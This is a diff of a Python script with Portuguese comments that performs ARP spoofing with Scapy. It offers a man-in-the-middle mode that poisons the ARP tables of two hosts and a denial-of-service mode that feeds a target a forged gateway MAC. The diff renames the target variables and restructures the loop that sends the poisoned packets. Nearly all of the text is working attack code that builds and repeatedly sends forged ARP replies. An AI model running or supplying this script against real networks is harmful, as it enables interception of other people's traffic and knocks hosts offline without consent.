@@ -7,7 +7,7 @@
 # Este script tem por finalidade realizar o ataques ARP Spoofing em uma rede.
 
 # Este script possui a capacidade de executar ataques "Man in the Middle" através do envenanamento da
-# tabela ARP de determinados hosts da rede. Possui também a função "DOS". Podendo ser utilizada para
+# tabela ARP de um determinado host da rede. Possui também a função "DOS". Podendo ser utilizada para
 # realiza ataque de negação de serviço em um único host da rede.
 
 # As bibliotecas "Scapy" e "Getmac" serão necessárias para a correta execução deste script. Sendo assim,
@@ -23,8 +23,8 @@ from scapy.all import Ether,ARP,sendp
 if len(sys.argv) <= 2:
 
 	# Informa ao usuário o modo de uso do script.
-	print ("Modo de uso MITM:", sys.argv[0],"ip-alvo1 ip-alvo2")
-	print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo ip-gateway")
+	print ("Modo de uso MITM:", sys.argv[0],"ip-alvo0 ip-alvo1")
+	print ("Modo de uso DoS:", sys.argv[0], "dos ip-alvo0 ip-gateway")
 
 # Verifica se o usuário deseja efetuar o ataque de negação de serviço (DoS).
 elif sys.argv[1] == "dos":
@@ -35,11 +35,11 @@ elif sys.argv[1] == "dos":
 
 	else:
 		# Utiliza a função get_mac_address para incluir o MAC do alvo na variável alvo_mac.
-		alvo_mac = get_mac_address(ip=sys.argv[2])
+		alvo0_mac = get_mac_address(ip=sys.argv[2])
 
 		# Verifica se a função coletou do endereço MAC do alvo.
-		while alvo_mac == "00:00:00:00:00:00":
-			alvo_mac = get_mac_address(ip=sys.argv[2])
+		while alvo0_mac == "00:00:00:00:00:00":
+			alvo0_mac = get_mac_address(ip=sys.argv[2])
 
 		# Utiliza a função get_mac_address para incluir o MAC do gateway na veriável gateway_mac.
 		gateway_mac = get_mac_address(ip=sys.argv[3])
@@ -48,12 +48,12 @@ elif sys.argv[1] == "dos":
 		while gateway_mac == "00:00:00:00:00:00":
 			gateway_mac = get_mac_address(ip=sys.argv[3])
 
-		print ("MAC do alvo:", alvo_mac)
+		print ("MAC do alvo0:", alvo0_mac)
 		print ("MAC do gateway:", gateway_mac)
 		print ("\nD0S 4TT4CK!\n£NV3NEN4ND0\n")
 
 		# Cria um pacote ARP com o endereço incorreto MAC do gateway.
-		pkt=Ether(dst=alvo_mac , src=gateway_mac)/ARP(op=2 , hwsrc="aa:bb:cc:dd:ee:ff", hwdst=alvo_mac , psrc=sys.argv[3] , pdst=sys.argv[2])
+		pkt=Ether(dst=alvo0_mac , src=gateway_mac)/ARP(op=2 , hwsrc="aa:bb:cc:dd:ee:ff", hwdst=alvo0_mac , psrc=sys.argv[3] , pdst=sys.argv[2])
 
 		#############################################################
 		# DICA: O campo "hwsrc" carrega o endereço MAC falsificado. #
@@ -80,27 +80,28 @@ else:
 		atacante_mac = get_mac_address()
 
 	# Utiliza a função get_mac_address para incluir o MAC do alvo1 na variável alvo_mac.
-	alvo1_mac = get_mac_address(ip=sys.argv[1])
+	alvo0_mac = get_mac_address(ip=sys.argv[1])
 
 	# Realiza a verificação do endereço MAC do alvo1.
-	while alvo1_mac == "00:00:00:00:00:00":
-		alvo1_mac = get_mac_address(ip=sys.argv[1])
+	while alvo0_mac == "00:00:00:00:00:00":
+		alvo0_mac = get_mac_address(ip=sys.argv[1])
 
 	# Utiliza a função get_mac_address para incluir o MAC do alvo2 na veriável gateway_mac.
-	alvo2_mac = get_mac_address(ip=sys.argv[2])
+	alvo1_mac = get_mac_address(ip=sys.argv[2])
 
 	# Realiza a verificaçao do endereço MAC do alvo2.
-	while alvo2_mac == "00:00:00:00:00:00":
-		alvo2_mac = get_mac_address(ip=sys.argv[2])
+	while alvo1_mac == "00:00:00:00:00:00":
+		alvo1_mac = get_mac_address(ip=sys.argv[2])
 
-	print ("\nMAC do alvo1:", alvo1_mac)
-	print ("MAC do alvo2:", alvo2_mac)
+	print ("\nMAC do alvo0:", alvo0_mac)
+	print ("MAC do alvo1:", alvo1_mac)
 	print ("\nM1TM 4TT4CK!\n£NV3NEN4ND0\n")
 
 	# Cria o pacote ARP Poisoning.
-	pkt=Ether(dst=alvo1_mac , src=alvo2_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo1_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
-	pkt1=Ether(dst=alvo2_mac , src=alvo1_mac)/ARP(op=2 , hwsrc=alvo1_mac, hwdst=atacante_mac , psrc=sys.argv[1] , pdst=sys.argv[2])
+	pkt=Ether(dst=alvo0_mac , src=alvo1_mac)/ARP(op=2 , hwsrc=atacante_mac, hwdst=alvo0_mac , psrc=sys.argv[2] , pdst=sys.argv[1])
+	pkt1=Ether(dst=alvo1_mac , src=alvo0_mac)/ARP(op=2 , hwsrc=alvo0_mac, hwdst=atacante_mac , psrc=sys.argv[1] , pdst=sys.argv[2])
 
+	# Tenta realizar uma tarefa.
 	try:
 		# Inicialização da variável de contagem para ilustração dos pacotes enviados.
 		i = 0
@@ -108,24 +109,30 @@ else:
 
 			# Ilustração dos pacotes enviados.
 			if (i % 2) == 0:
+
+				# Envia o pacote envenenado para o alvo 0.
+				sendp(pkt, verbose=0)
+
+				# Ilustra o pacote 0.
 				print("0", end="", flush=True)
+
+				# Aguarda 0.1 segundo.
+				time.sleep(0.1)
+
 			else:
+				# Envia o pacote envenenado para o alvo 1.
+				sendp(pkt1, verbose=0)
+
+				# Ilustra o pacote 1.
 				print("1", end="", flush=True)
 
-			# Envia o pacote para o alvo 1.
-			sendp(pkt, verbose=0)
+				# Aguarda 0.1 segundo.
+				time.sleep(0.1)
 
-			# Intervalo de 0.1 segundos entre o envio do proximo pacote.
-			time.sleep(0.1)
-
-			# Envia o pacote para o alvo 2.
-			sendp(pkt1, verbose=0)
-
-			# Intervalo de 0.1 segundo entre o envio do proximo pacote.
-			time.sleep(0.1)
-
-			# Incremento da variável de contagem.
+			# Incrementa a variável de contagem para a ilustração.
 			i += 1
+
+	# Exceto interrupção do teclado.
 	except KeyboardInterrupt:
 
 		# Desabilita o redirecionamento de pacotes.
